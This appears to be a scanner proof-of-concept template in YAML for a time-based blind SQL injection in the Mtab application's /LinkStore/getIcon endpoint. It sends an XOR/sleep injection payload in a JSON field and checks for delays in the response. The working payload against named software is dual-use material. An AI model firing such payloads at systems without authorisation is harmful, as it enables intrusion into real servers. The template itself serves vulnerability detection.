name: poc-yaml-Mtab-LinkStore_getIcon-sql
transport: http


rules:
  r0:
    request:
      method: POST
      path: /LinkStore/getIcon
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
        Content-Type: application/json
      body: |
        {"url":"'XOR(if(now()=sysdate(),sleep(6),0))XOR'"}
    expression: response.latency >= 6000 && response.latency <= 7000
  r1:
    request:
      method: POST
      path: /LinkStore/getIcon
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
        Content-Type: application/json
      body: |
        {"url":"'XOR(if(now()=sysdate(),sleep(10),0))XOR'"}
    expression: response.latency >= 10000 && response.latency <= 11000

expression: r0() && r1()

